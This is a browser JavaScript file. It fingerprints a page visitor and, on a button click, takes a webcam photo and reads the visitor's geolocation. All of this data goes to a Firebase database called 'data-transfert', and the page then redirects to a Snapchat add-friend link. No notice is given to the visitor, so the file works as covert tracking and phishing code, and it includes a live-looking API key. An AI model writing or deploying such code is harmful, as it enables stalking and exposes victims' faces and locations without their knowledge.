import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

async function logData() {
    // Firebase configuration and initialization
    const firebaseConfig = {
        apiKey: "AIzaSyD-IOULsrU9K7U9ASa74Wlpu_zfk3FBwuI",
        authDomain: "data-transfert-dc397.firebaseapp.com",
        databaseURL: "https://data-transfert-dc397-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "data-transfert-dc397",
        storageBucket: "data-transfert-dc397.appspot.com",
        messagingSenderId: "769173749251",
        appId: "1:769173749251:web:ffa9a302f46c9fee471836",
        measurementId: "G-ZBRMKEPHYP"
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    // Function to send data to Firebase Realtime Database
    function sendToFirebase(data) {
        push(ref(database, 'submissions'), data)
            .then(() => {
                console.log('Data successfully submitted');
            })
            .catch(error => {
                console.error('Submission error:', error);
            });
    }

    // Collect basic data
    const collectedData = {
        userAgent: navigator.userAgent,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        httpReferrer: document.referrer || "No referrer",
        cookiesEnabled: navigator.cookieEnabled,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        sessionStartTime: new Date().toLocaleString()
    };

    // Send basic data to Firebase
    sendToFirebase({ ...collectedData, type: 'basic' });

    // Request access to the camera and capture an image
    async function capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.play();

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            videoElement.addEventListener('loadeddata', async () => {
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                // Convert the image to Base64
                const imageData = canvas.toDataURL('image/png');  // Converts image to base64 string

                // Send the Base64 data to Firebase
                sendToFirebase({
                    photoBase64: imageData,
                    type: 'photo'
                });

                // Stop the video stream
                stream.getTracks().forEach(track => track.stop());
                console.log("Photo captured and sent to Firebase.");

                // After photo is sent, request geolocation
                requestGeolocation();
            });
        } catch (error) {
            console.error("Camera access error:", error);
        }
    }

    // Request geolocation only after the photo has been sent
    function requestGeolocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const geolocationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    console.log("Geolocation collected:", geolocationData);
                    sendToFirebase({ geolocation: geolocationData, type: 'geolocation' });

                    // After photo and geolocation are sent, redirect
                    window.location.href = 'https://www.snapchat.com/add/peuf6911'; // Redirection URL
                },
                (error) => {
                    console.error("Geolocation error:", error.message);
                }
            );
        } else {
            console.log("Geolocation not supported by this browser.");
        }
    }

    // Adding event listener to the button to trigger the photo capture
    document.getElementById("captureButton").addEventListener("click", async () => {
        // Make sure the photo is captured before requesting geolocation
        await capturePhoto();  // Capture the photo first
    });
}

// Call the function
logData();
